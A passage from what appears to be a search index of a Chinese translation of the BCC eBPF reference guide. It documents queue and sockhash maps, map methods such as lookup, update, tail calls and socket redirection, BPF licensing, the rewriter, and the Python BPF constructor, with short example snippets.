<p>\u65b9\u6cd5\uff08\u540e\u9762\u4f1a\u6d89\u53ca\uff09\uff1amap.push()\u3001map.pop()\u3001map.peek()\u3002</p> <p>\u793a\u4f8b\uff1a</p> <p>\u5728 search /tests \u4e2d\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#17-bpf_queue","title":"17. BPF_QUEUE","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_QUEUE(name, leaf_type, max_entries[, flags])</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684\u961f\u5217\uff0c\u5176\u503c\u7c7b\u578b\u4e3a <code>leaf_type</code>\uff0c\u6700\u5927\u6761\u76ee\u6570\u4e3a <code>max_entries</code>\u3002 \u5806\u6808\u548c\u961f\u5217\u6620\u5c04\u4ec5\u9002\u7528\u4e8e Linux 4.20+\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_QUEUE(queue, struct event, 10240);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>queue</code> \u7684\u961f\u5217\uff0c\u5176\u503c\u7c7b\u578b\u4e3a <code>struct event</code>\uff0c\u6700\u591a\u53ef\u5bb9\u7eb3 10240 \u4e2a\u6761\u76ee\u3002</p> <p>\u65b9\u6cd5\uff08\u540e\u9762\u4f1a\u6d89\u53ca\uff09\uff1amap.push()\u3001map.pop()\u3001map.peek()\u3002</p> <p>\u793a\u4f8b\uff1a</p> <p>\u5728 search /tests \u4e2d\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#18-bpf_sockhash","title":"18. BPF_SOCKHASH","text":"<p>\u8bed\u6cd5\uff1a<code>BPF_SOCKHASH(name[, key_type [, max_entries)</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>name</code> \u7684\u54c8\u5e0c\uff0c\u5e26\u6709\u53ef\u9009\u53c2\u6570\u3002sockhash\u4ec5\u9002\u7528\u4e8eLinux 4.18+\u3002</p> <p>\u9ed8\u8ba4\u503c\uff1a<code>BPF_SOCKHASH(name, key_type=u32, max_entries=10240)</code></p> <p>\u4f8b\u5982\uff1a</p> <pre><code>struct sock_key {\n  u32 remote_ip4;\n  u32 local_ip4;\n  u32 remote_port;\n  u32 local_port;\n};\nBPF_HASH(skh, struct sock_key, 65535);\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>skh</code> \u7684\u54c8\u5e0c\u8868\uff0c\u5176\u4e2d\u952e\u662f <code>struct sock_key</code>\u3002</p> <p>sockhash\u662f\u4e00\u79cdBPF\u6620\u5c04\u7c7b\u578b\uff0c\u5b83\u4fdd\u5b58\u5bf9sock\u7ed3\u6784\u4f53\u7684\u5f15\u7528\u3002\u7136\u540e\uff0c\u901a\u8fc7\u4f7f\u7528\u65b0\u7684sk/msg\u91cd\u5b9a\u5411BPF\u8f85\u52a9\u51fd\u6570\uff0cBPF\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u8be5\u6620\u5c04\u5728\u5957\u63a5\u5b57\u4e4b\u95f4\u91cd\u5b9a\u5411skbs/msgs\uff08<code>map.sk_redirect_hash()/map.msg_redirect_hash()</code>\uff09\u3002<code>BPF_SOCKHASH</code>\u548c<code>BPF_SOCKMAP</code>\u7684\u533a\u522b\u5728\u4e8e<code>BPF_SOCKMAP</code>\u662f\u57fa\u4e8e\u6570\u7ec4\u5b9e\u73b0\u7684\uff0c\u5e76\u4e14\u5f3a\u5236\u952e\u4e3a\u56db\u4e2a\u5b57\u8282\u3002 \u800c<code>BPF_SOCKHASH</code>\u662f\u57fa\u4e8e\u54c8\u5e0c\u8868\u5b9e\u73b0\u7684\uff0c\u5e76\u4e14\u952e\u7684\u7c7b\u578b\u53ef\u4ee5\u81ea\u7531\u6307\u5b9a\u3002</p> <p>\u65b9\u6cd5\uff08\u7a0d\u540e\u4ecb\u7ecd\uff09\uff1amap.sock_hash_update()\uff0cmap.msg_redirect_hash()\uff0cmap.sk_redirect_hash()\u3002</p> <p>\u641c\u7d22/tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#19-maplookup","title":"19. map.lookup()","text":"<p>\u8bed\u6cd5\uff1a<code>*val map.lookup(&amp;key)</code></p> <p>\u5728\u6620\u5c04\u4e2d\u67e5\u627e\u952e\uff0c\u5982\u679c\u5b58\u5728\u5219\u8fd4\u56de\u6307\u5411\u5176\u503c\u7684\u6307\u9488\uff0c\u5426\u5219\u8fd4\u56deNULL\u3002\u6211\u4eec\u5c06\u952e\u4f5c\u4e3a\u6307\u9488\u7684\u5730\u5740\u4f20\u5165\u3002</p> <p>\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#20-maplookup_or_try_init","title":"20. map.lookup_or_try_init()","text":"<p>\u8bed\u6cd5\uff1a<code>*val map.lookup_or_try_init(&amp;key, &amp;zero)</code></p> <p>\u5728\u6620\u5c04\u4e2d\u67e5\u627e\u952e\uff0c\u5982\u679c\u5b58\u5728\u5219\u8fd4\u56de\u6307\u5411\u5176\u503c\u7684\u6307\u9488\uff0c\u5426\u5219\u5c06\u952e\u7684\u503c\u521d\u59cb\u5316\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u901a\u5e38\u7528\u4e8e\u5c06\u503c\u521d\u59cb\u5316\u4e3a\u96f6\u3002\u5982\u679c\u65e0\u6cd5\u63d2\u5165\u952e\uff08\u4f8b\u5982\u6620\u5c04\u5df2\u6ee1\uff09\uff0c\u5219\u8fd4\u56deNULL\u3002</p> <p>\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p> <p>\u6ce8\u610f\uff1a\u65e7\u7684map.lookup_or_init()\u53ef\u80fd\u5bfc\u81f4\u51fd\u6570\u8fd4\u56de\uff0c\u56e0\u6b64\u5efa\u8bae\u4f7f\u7528lookup_or_try_init()\uff0c\u5b83\u6ca1\u6709\u8fd9\u79cd\u526f\u4f5c\u7528\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#21-mapdelete","title":"21. map.delete()","text":"<p>\u8bed\u6cd5\uff1a<code>map.delete(&amp;key)</code></p> <p>\u4ece\u54c8\u5e0c\u8868\u4e2d\u5220\u9664\u952e\u3002</p> <p>\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#22-mapupdate","title":"22. map.update()","text":"<p>\u8bed\u6cd5\uff1a<code>map.update(&amp;key, &amp;val)</code></p> <p>\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d\u7684\u503c\u4e0e\u952e\u5173\u8054\uff0c\u8986\u76d6\u4efb\u4f55\u5148\u524d\u7684\u503c\u3002</p> <p>\u793a\u4f8b\uff1a\"\u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#23-mapinsert","title":"23. map.insert()","text":"<p>\u8bed\u6cd5: <code>map.insert(&amp;key, &amp;val)</code></p> <p>\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d\u7684\u503c\u4e0e\u952e\u76f8\u5173\u8054\uff0c\u4ec5\u5728\u4e4b\u524d\u6ca1\u6709\u503c\u7684\u60c5\u51b5\u4e0b\u3002</p> <p>\u73b0\u573a\u793a\u4f8b: \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#24-mapincrement","title":"24. map.increment()","text":"<p>\u8bed\u6cd5: <code>map.increment(key[, increment_amount])</code></p> <p>\u901a\u8fc7 <code>increment_amount</code>\uff08\u9ed8\u8ba4\u4e3a1\uff09\u589e\u52a0\u952e\u7684\u503c\u3002\u7528\u4e8e\u67f1\u72b6\u56fe\u3002</p> <p><code>map.increment()</code>\u4e0d\u662f\u539f\u5b50\u64cd\u4f5c\u3002\u5728\u5e76\u53d1\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u8981\u83b7\u5f97\u66f4\u51c6\u786e\u7684\u7ed3\u679c\uff0c\u8bf7\u4f7f\u7528 <code>map.atomic_increment()</code> \u800c\u4e0d\u662f <code>map.increment()</code>\u3002<code>map.increment()</code> \u548c <code>map.atomic_increment()</code> \u7684\u5f00\u9500\u76f8\u4f3c\u3002</p> <p>\u6ce8\u610f. \u5f53\u4f7f\u7528 <code>map.atomic_increment()</code> \u64cd\u4f5c\u7c7b\u578b\u4e3a <code>BPF_MAP_TYPE_HASH</code> \u7684 BPF map \u65f6\uff0c\u5982\u679c\u6307\u5b9a\u7684\u952e\u4e0d\u5b58\u5728\uff0c\u5219 <code>map.atomic_increment()</code> \u65e0\u6cd5\u4fdd\u8bc1\u64cd\u4f5c\u7684\u539f\u5b50\u6027\u3002</p> <p>\u73b0\u573a\u793a\u4f8b: \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#25-mapget_stackid","title":"25. map.get_stackid()","text":"<p>\u8bed\u6cd5: <code>int map.get_stackid(void *ctx, u64 flags)</code></p> <p>\u8fd9\u4f1a\u904d\u5386\u5728 <code>ctx</code> \u4e2d\u627e\u5230\u7684 struct pt_regs \u4e2d\u7684\u5806\u6808\uff0c\u5c06\u5176\u4fdd\u5b58\u5728\u5806\u6808\u8ddf\u8e2a map \u4e2d\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u552f\u4e00\u7684\u5806\u6808\u8ddf\u8e2a ID\u3002</p> <p>\u73b0\u573a\u793a\u4f8b: \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#26-mapperf_read","title":"26. map.perf_read()","text":"<p>\u8bed\u6cd5: <code>u64 map.perf_read(u32 cpu)</code></p> <p>\u73b0\u573a\u793a\u4f8b:\"\"\u641c\u7d22/tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#27-mapcall","title":"27. map.call()","text":"<p>\u8bed\u6cd5\uff1a<code>void map.call(void *ctx, int index)</code></p> <p>\u8fd9\u5c06\u8c03\u7528<code>bpf_tail_call()</code>\u6765\u5c3e\u8c03\u7528BPF_PROG_ARRAY\u4e2d\u6307\u5411<code>index</code>\u5165\u53e3\u7684bpf\u7a0b\u5e8f\u3002\u5c3e\u8c03\u7528\u4e0e\u666e\u901a\u8c03\u7528\u4e0d\u540c\u3002\u5b83\u5728\u8df3\u8f6c\u5230\u53e6\u4e00\u4e2abpf\u7a0b\u5e8f\u540e\u91cd\u7528\u5f53\u524d\u7684\u6808\u5e27\uff0c\u5e76\u4e14\u4e0d\u4f1a\u8fd4\u56de\u3002\u5982\u679c<code>index</code>\u5165\u53e3\u4e3a\u7a7a\uff0c\u5b83\u5c06\u4e0d\u4f1a\u8df3\u8f6c\u5230\u4efb\u4f55\u5730\u65b9\uff0c\u7a0b\u5e8f\u7684\u6267\u884c\u5c06\u4f1a\u7ee7\u7eed\u8fdb\u884c\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_PROG_ARRAY(prog_array, 10);\n\nint tail_call(void *ctx) {\n    bpf_trace_printk(\"\u5c3e\u8c03\u7528\\n\");\n    return 0;\n}\n\nint do_tail_call(void *ctx) {\n    bpf_trace_printk(\"\u539f\u59cb\u7684\u7a0b\u5e8f\\n\");\n    prog_array.call(ctx, 2);\n    return 0;\n}\n</code></pre> <pre><code>b = BPF(src_file=\"example.c\")\ntail_fn = b.load_func(\"tail_call\", BPF.KPROBE)\nprog_array = b.get_table(\"prog_array\")\nprog_array[c_int(2)] = c_int(tail_fn.fd)\nb.attach_kprobe(event=\"some_kprobe_event\", fn_name=\"do_tail_call\")\n</code></pre> <p>\u8fd9\u5c06<code>tail_call()</code>\u5206\u914d\u7ed9<code>prog_array[2]</code>\u3002\u5728<code>do_tail_call()</code>\u7684\u6700\u540e\uff0c<code>prog_array.call(ctx, 2)</code>\u5c3e\u8c03\u7528<code>tail_call()</code>\u5e76\u6267\u884c\u5b83\u3002</p> <p>\u6ce8\u610f\uff1a\u4e3a\u4e86\u9632\u6b62\u65e0\u9650\u5faa\u73af\uff0c\u5c3e\u8c03\u7528\u7684\u6700\u5927\u6570\u91cf\u662f32\uff08<code>MAX_TAIL_CALL_CNT</code>\uff09\u3002</p> <p>\u5728\u73b0\u573a\u793a\u4f8b\u4e2d\uff1a \u641c\u7d22/examples, \u641c\u7d22/tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#28-mapredirect_map","title":"28. map.redirect_map()","text":"<p>\u8bed\u6cd5\uff1a<code>int map.redirect_map(int index, int flags)</code>\".\u8fd9\u5c06\u6839\u636e <code>index</code> \u6761\u76ee\u91cd\u5b9a\u5411\u4f20\u5165\u7684\u6570\u636e\u5305\u3002\u5982\u679c\u6620\u5c04\u662f BPF_DEVMAP\uff0c\u6570\u636e\u5305\u5c06\u88ab\u53d1\u9001\u5230\u8be5\u6761\u76ee\u6307\u5411\u7684\u7f51\u7edc\u63a5\u53e3\u7684\u4f20\u8f93\u961f\u5217\u3002\u5982\u679c\u6620\u5c04\u662f BPF_CPUMAP\uff0c\u6570\u636e\u5305\u5c06\u88ab\u53d1\u9001\u5230<code>index</code> CPU\u7684\u73af\u5f62\u7f13\u51b2\u533a\uff0c\u5e76\u7a0d\u540e\u7531CPU\u5904\u7406\u3002\u5982\u679c\u6620\u5c04\u662f BPF_XSKMAP\uff0c\u6570\u636e\u5305\u5c06\u88ab\u53d1\u9001\u5230\u8fde\u63a5\u5230\u961f\u5217\u7684 AF_XDP \u5957\u63a5\u5b57\u3002</p> <p>\u5982\u679c\u6570\u636e\u5305\u6210\u529f\u88ab\u91cd\u5b9a\u5411\uff0c\u8be5\u51fd\u6570\u5c06\u8fd4\u56de XDP_REDIRECT\u3002\u5426\u5219\uff0c\u5c06\u8fd4\u56de XDP_ABORTED \u4ee5\u4e22\u5f03\u8be5\u6570\u636e\u5305\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>BPF_DEVMAP(devmap, 1);\n\nint redirect_example(struct xdp_md *ctx) {\n    return devmap.redirect_map(0, 0);\n}\nint xdp_dummy(struct xdp_md *ctx) {\n    return XDP_PASS;\n}\n</code></pre> <pre><code>ip = pyroute2.IPRoute()\nidx = ip.link_lookup(ifname=\"eth1\")[0]\n\nb = bcc.BPF(src_file=\"example.c\")\n\ndevmap = b.get_table(\"devmap\")\ndevmap[c_uint32(0)] = c_int(idx)\n\nin_fn = b.load_func(\"redirect_example\", BPF.XDP)\nout_fn = b.load_func(\"xdp_dummy\", BPF.XDP)\nb.attach_xdp(\"eth0\", in_fn, 0)\nb.attach_xdp(\"eth1\", out_fn, 0)\n</code></pre> <p>\u793a\u4f8b\u4f4d\u7f6e\uff1a \u641c\u7d22 /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#29-mappush","title":"29. map.push()","text":"<p>\u8bed\u6cd5\uff1a<code>int map.push(&amp;val, int flags)</code></p> <p>\u5c06\u5143\u7d20\u63a8\u5165\u5806\u6808\u6216\u961f\u5217\u8868\u3002\u5c06 BPF_EXIST \u4f5c\u4e3a\u6807\u5fd7\u4f20\u9012\u4f1a\u5bfc\u81f4\u961f\u5217\u6216\u5806\u6808\u5728\u5df2\u6ee1\u65f6\u4e22\u5f03\u6700\u65e7\u7684\u5143\u7d20\u3002\u6210\u529f\u8fd4\u56de0\uff0c\u5931\u8d25\u8fd4\u56de\u8d1f\u9519\u8bef\u503c\u3002</p> <p>\u793a\u4f8b\u4f4d\u7f6e\uff1a \u641c\u7d22 /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#30-mappop","title":"30. map.pop()","text":"<p>\u8bed\u6cd5\uff1a<code>int map.pop(&amp;val)</code></p> <p>\u4ece\u5806\u6808\u6216\u961f\u5217\u8868\u4e2d\u5f39\u51fa\u4e00\u4e2a\u5143\u7d20\u3002<code>*val</code>\u88ab\u586b\u5145\u4e3a\u7ed3\u679c\u3002\u4e0e\u67e5\u770b\u4e0d\u540c\uff0c\u5f39\u51fa\u64cd\u4f5c\u4f1a\u79fb\u9664\u8be5\u5143\u7d20\u3002\u6210\u529f\u8fd4\u56de0\uff0c\u5931\u8d25\u8fd4\u56de\u8d1f\u9519\u8bef\u503c\u3002</p> <p>\u793a\u4f8b\u4f4d\u7f6e\uff1a \u641c\u7d22 /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#31-mappeek","title":"31. map.peek()","text":"<p>\u8bed\u6cd5\uff1a<code>int map.peek(&amp;val)</code>\u67e5\u770b\u5806\u6808\u6216\u961f\u5217\u8868\u5934\u7684\u5143\u7d20\u3002<code>*val</code>\u5c06\u88ab\u7ed3\u679c\u586b\u5145\u3002 \u4e0e\u5f39\u51fa\u4e0d\u540c\uff0c\u67e5\u770b\u4e0d\u4f1a\u5220\u9664\u5143\u7d20\u3002 \u6210\u529f\u8fd4\u56de0\uff0c\u5931\u8d25\u8fd4\u56de\u8d1f\u9519\u8bef\u3002</p> <p>\u5b9e\u4f8b\uff1a \u641c\u7d22/tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#32-mapsock_hash_update","title":"32. map.sock_hash_update()","text":"<p>\u8bed\u6cd5\uff1a<code>int map.sock_hash_update(struct bpf_sock_ops *skops, &amp;key, int flags)</code></p> <p>\u5411sockhash\u6620\u5c04\u6dfb\u52a0\u6761\u76ee\u6216\u66f4\u65b0\u6761\u76ee\u3002skops\u7528\u4f5c\u4e0e\u952e\u76f8\u5173\u8054\u7684\u6761\u76ee\u7684\u65b0\u503c\u3002flags\u4e3a\u4ee5\u4e0b\u4e4b\u4e00\uff1a</p> <pre><code>BPF_NOEXIST\uff1a\u6620\u5c04\u4e2d\u4e0d\u5f97\u5b58\u5728key\u7684\u6761\u76ee\u3002\nBPF_EXIST\uff1a\u6620\u5c04\u4e2d\u5fc5\u987b\u5df2\u5b58\u5728key\u7684\u6761\u76ee\u3002\nBPF_ANY\uff1a\u5bf9\u4e8ekey\u7684\u6761\u76ee\u662f\u5426\u5b58\u5728\uff0c\u6ca1\u6709\u6761\u4ef6\u3002\n</code></pre> <p>\u5982\u679c\u6620\u5c04\u5177\u6709eBPF\u7a0b\u5e8f\uff08\u89e3\u6790\u5668\u548c\u5224\u51b3\u5668\uff09\uff0c\u5219\u8fd9\u4e9b\u7a0b\u5e8f\u5c06\u88ab\u6dfb\u52a0\u7684\u5957\u63a5\u5b57\u7ee7\u627f\u3002\u5982\u679c\u5957\u63a5\u5b57\u5df2\u7ecf\u9644\u52a0\u5230eBPF\u7a0b\u5e8f\uff0c\u5219\u4f1a\u51fa\u9519\u3002</p> <p>\u6210\u529f\u8fd4\u56de0\uff0c\u5931\u8d25\u8fd4\u56de\u8d1f\u9519\u8bef\u3002</p> <p>\u5b9e\u4f8b\uff1a \u641c\u7d22/tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#33-mapmsg_redirect_hash","title":"33. map.msg_redirect_hash()","text":"<p>\u8bed\u6cd5\uff1a<code>int map.msg_redirect_hash(struct sk_msg_buff *msg, void*key, u64 flags)</code></p> <p>\u8be5\u8f85\u52a9\u7a0b\u5e8f\u7528\u4e8e\u5728\u5957\u63a5\u5b57\u7ea7\u522b\u5b9e\u65bd\u7b56\u7565\u7684\u7a0b\u5e8f\u4e2d\u3002\u5982\u679c\u6d88\u606fmsg\u88ab\u5141\u8bb8\u901a\u8fc7\uff08\u5373\u5224\u51b3eBPF\u7a0b\u5e8f\u8fd4\u56deSK_PASS\uff09\uff0c\u5219\u4f7f\u7528\u54c8\u5e0c\u952e\u5c06\u5176\u91cd\u5b9a\u5411\u5230\u6620\u5c04\u5f15\u7528\u7684\u5957\u63a5\u5b57\uff08\u7c7b\u578b\u4e3aBPF_MAP_TYPE_SOCKHASH\uff09\u3002\u53ef\u4ee5\u4f7f\u7528\u5165\u7ad9\u548c\u51fa\u7ad9\u63a5\u53e3\u8fdb\u884c\u91cd\u5b9a\u5411\u3002\u6807\u5fd7\u4e2d\u7684BPF_F_INGRESS\u503c\u7528\u4e8e\u533a\u5206\uff08\u5982\u679c\u5b58\u5728\u8be5\u6807\u5fd7\uff0c\u5219\u9009\u62e9\u5165\u7ad9\u8def\u5f84\uff0c\u5426\u5219\u9009\u62e9\u51fa\u7ad9\u8def\u5f84\uff09\u3002\u76ee\u524d\uff0c\u8fd9\u662f\u552f\u4e00\u652f\u6301\u7684\u6807\u5fd7\u3002</p> <p>\u6210\u529f\u8fd4\u56deSK_PASS\uff0c\u53d1\u751f\u9519\u8bef\u8fd4\u56deSK_DROP\u3002</p> <p>\u5b9e\u4f8b\uff1a \u641c\u7d22/tests</p>"},{"location":"tutorials/bcc-documents/reference_guide/#34-mapsk_redirect_hash","title":"34. map.sk_redirect_hash()","text":"<p>\u8bed\u6cd5\uff1a<code>int map.sk_redirect_hash(struct sk_buff *skb, void*key, u64 flags)</code>\".This helper is used in programs implementing policies at the skb socket level. If the sk_buff skb is allowed to pass (i.e. if the verdict eBPF program returns SK_PASS), redirect it to the socket referenced by map (of type BPF_MAP_TYPE_SOCKHASH) using hash key. Both ingress and egress interfaces can be used for redirection. The BPF_F_INGRESS value in flags is used to make the distinction (ingress path is selected if the flag is present, egress otherwise). This is the only flag supported for now.</p> <p>Return SK_PASS on success, or SK_DROP on error.</p> <p>Examples in situ: [\u641c\u7d22/tests](&lt;https://github.com/iovisor/bcc/search?q=sk_redirect_hash+path%3Atests&amp;type=Code&gt;),</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_6","title":"\u8bb8\u53ef\u8bc1","text":"<p>Depending on which [BPF helpers](kernel-versions.md#helpers) are used, a GPL-compatible license is required.</p> <p>The special BCC macro <code>BPF_LICENSE</code> specifies the license of the BPF program. You can set the license as a comment in your source code, but the kernel has a special interface to specify it programmatically. If you need to use GPL-only helpers, it is recommended to specify the macro in your C code so that the kernel can understand it:</p> <pre><code>// SPDX-License-Identifier: GPL-2.0+\n#define BPF_LICENSE GPL\n</code></pre> <p>Otherwise, the kernel may reject loading your program (see the [\u9519\u8bef\u63cf\u8ff0](#2-cannot-call-gpl-only-function-from-proprietary-program) below). Note that it supports multiple words and quotes are not necessary:</p> <pre><code>// SPDX-License-Identifier: GPL-2.0+ OR BSD-2-Clause\n#define BPF_LICENSE Dual BSD/GPL\n</code></pre> <p>Check the [BPF helpers reference](kernel-versions.md#helpers) to see which helpers are GPL-only and what the kernel understands as GPL-compatible.</p> <p>If the macro is not specified, BCC will automatically define the license of the program as GPL.</p>"},{"location":"tutorials/bcc-documents/reference_guide/#rewriter","title":"Rewriter","text":"<p>\u4e00\u4e2a\u91cd\u5199\u5668\u7684\u5de5\u4f5c\u662f\u4f7f\u7528\u5185\u6838\u8f85\u52a9\u7a0b\u5e8f\u5c06\u9690\u5f0f\u5185\u5b58\u8bbf\u95ee\u8f6c\u6362\u4e3a\u663e\u5f0f\u5185\u5b58\u8bbf\u95ee\u3002\u6700\u8fd1\u7684\u5185\u6838\u5f15\u5165\u4e86\u4e00\u4e2a\u914d\u7f6e\u9009\u9879ARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACE\uff0c\u8be5\u9009\u9879\u5c06\u88ab\u8bbe\u7f6e\u4e3a\u4f7f\u7528\u7528\u6237\u5730\u5740\u7a7a\u95f4\u548c\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e0d\u91cd\u53e0\u7684\u4f53\u7cfb\u7ed3\u6784\u3002x86\u548carm\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u914d\u7f6e\u9009\u9879\uff0c\u800cs390\u6ca1\u6709\u3002\u5982\u679c\u6ca1\u6709\u8bbe\u7f6eARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACE\uff0cbpf\u65e7\u5e2e\u52a9\u51fd\u6570<code>bpf_probe_read()</code>\u5c06\u4e0d\u53ef\u7528\u3002\u4e00\u4e9b\u73b0\u6709\u7684\u7528\u6237\u53ef\u80fd\u6709\u9690\u5f0f\u5185\u5b58\u8bbf\u95ee\u6765\u8bbf\u95ee\u7528\u6237\u5185\u5b58\uff0c\u6240\u4ee5\u4f7f\u7528<code>bpf_probe_read_kernel()</code>\u4f1a\u5bfc\u81f4\u4ed6\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u5931\u8d25\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u975es390\uff0c\u91cd\u5199\u5668\u5c06\u5bf9\u8fd9\u4e9b\u9690\u5f0f\u5185\u5b58\u8bbf\u95ee\u4f7f\u7528<code>bpf_probe_read()</code>\u3002\u5bf9\u4e8es390\uff0c\u9ed8\u8ba4\u4f7f\u7528<code>bpf_probe_read_kernel()</code>\uff0c\u7528\u6237\u5728\u8bbf\u95ee\u7528\u6237\u5185\u5b58\u65f6\u5e94\u663e\u5f0f\u4f7f\u7528<code>bpf_probe_read_user()</code></p>"},{"location":"tutorials/bcc-documents/reference_guide/#bcc-python","title":"bcc Python","text":""},{"location":"tutorials/bcc-documents/reference_guide/#_7","title":"\u521d\u59cb\u5316","text":"<p>\u6784\u9020\u51fd\u6570\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#1-bpf","title":"1. BPF","text":"<p>\u8bed\u6cd5: <code>BPF({text=BPF_program | src_file=filename} [, usdt_contexts=[USDT_object, ...]] [, cflags=[arg1, ...]] [, debug=int])</code></p> <p>\u521b\u5efa\u4e00\u4e2aBPF\u5bf9\u8c61\u3002\u8fd9\u662f\u5b9a\u4e49BPF\u7a0b\u5e8f\u5e76\u4e0e\u5176\u8f93\u51fa\u4ea4\u4e92\u7684\u4e3b\u8981\u5bf9\u8c61\u3002</p> <p>\u5fc5\u987b\u63d0\u4f9b<code>text</code>\u6216<code>src_file</code>\u4e4b\u4e00\uff0c\u4e0d\u80fd\u4e24\u8005\u90fd\u63d0\u4f9b\u3002</p> <p><code>cflags</code>\u6307\u5b9a\u8981\u4f20\u9012\u7ed9\u7f16\u8bd1\u5668\u7684\u989d\u5916\u53c2\u6570\uff0c\u4f8b\u5982<code>-DMACRO_NAME=value</code>\u6216<code>-I/include/path</code>\u3002\u53c2\u6570\u4ee5\u6570\u7ec4\u5f62\u5f0f\u4f20\u9012\uff0c\u6bcf\u4e2a\u5143\u7d20\u4e3a\u4e00\u4e2a\u989d\u5916\u7684\u53c2\u6570\u3002\u6ce8\u610f\uff0c\u5b57\u7b26\u4e32\u4e0d\u4f1a\u6309\u7a7a\u683c\u62c6\u5206\uff0c\u6240\u4ee5\u6bcf\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u6570\u7ec4\u7684\u4e0d\u540c\u5143\u7d20\uff0c\u4f8b\u5982<code>[\"-include\", \"header.h\"]</code>\u3002</p> <p><code>debug</code>\u6807\u5fd7\u63a7\u5236\u8c03\u8bd5\u8f93\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528\u6216\u8fd0\u7b97:</p> <ul> <li><code>DEBUG_LLVM_IR = 0x1</code> \u7f16\u8bd1\u540e\u7684LLVM IR</li> <li><code>DEBUG_BPF = 0x2</code> \u52a0\u8f7d\u7684BPF\u5b57\u8282\u7801\u548c\u5206\u652f\u65f6\u7684\u5bc4\u5b58\u5668\u72b6\u6001</li> <li><code>DEBUG_PREPROCESSOR = 0x4</code> \u9884\u5904\u7406\u5668\u7684\u7ed3\u679c</li> <li><code>DEBUG_SOURCE = 0x8</code> \u5d4c\u5165\u6e90\u7801\u7684ASM\u6307\u4ee4</li> <li><code>DEBUG_BPF_REGISTER_STATE = 0x10</code> \u6240\u6709\u6307\u4ee4\u7684\u5bc4\u5b58\u5668\u72b6\u6001\uff0c\u989d\u5916\u6253\u5370DEBUG_BPF\u7684\u4fe1\u606f</li> <li><code>DEBUG_BTF = 0x20</code> \u6253\u5370\u6765\u81ea<code>libbpf</code>\u5e93\u7684\u6d88\u606f\u3002</li> </ul> <p>\u793a\u4f8b:</p> <p>```Python\"# \u5b9a\u4e49\u6574\u4e2aBPF\u7a0b\u5e8f\u5728\u4e00\u884c\u4e2d: BPF(text='int do_trace(void *ctx) { bpf_trace_printk(\"\u547d\u4e2d\uff01\\n\"); return 0; }');</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_8","title":"\u5b9a\u4e49\u7a0b\u5e8f\u4e3a\u4e00\u4e2a\u53d8\u91cf:","text":"<p>prog = \"\"\" int hello(void *ctx) {     bpf_trace_printk(\"\u4f60\u597d\uff0c\u4e16\u754c\uff01\\n\");     return 0; } \"\"\" b = BPF(text=prog)</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_9","title":"\u6e90\u6587\u4ef6:","text":"<p>b = BPF(src_file = \"vfsreadlat.c\")</p>"},{"location":"tutorials/bcc-documents/reference_guide/#usdt","title":"\u5305\u62ec\u4e00\u4e2aUSDT\u5bf9\u8c61:","text":"<p>u = USDT(pid=int(pid)) [...] b = BPF(text=bpf_text, usdt_contexts=[u])</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_10","title":"\u6dfb\u52a0\u5305\u542b\u8def\u5f84:","text":"<p>u = BPF(text=prog, cflags=[\"-I/path/to/include\"])</p> <p>\u5728\u539f\u5730\u7684\u793a\u4f8b: \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-usdt","title":"2. USDT","text":"<p>\u8bed\u6cd5: <code>USDT({pid=pid | path=path})</code></p> 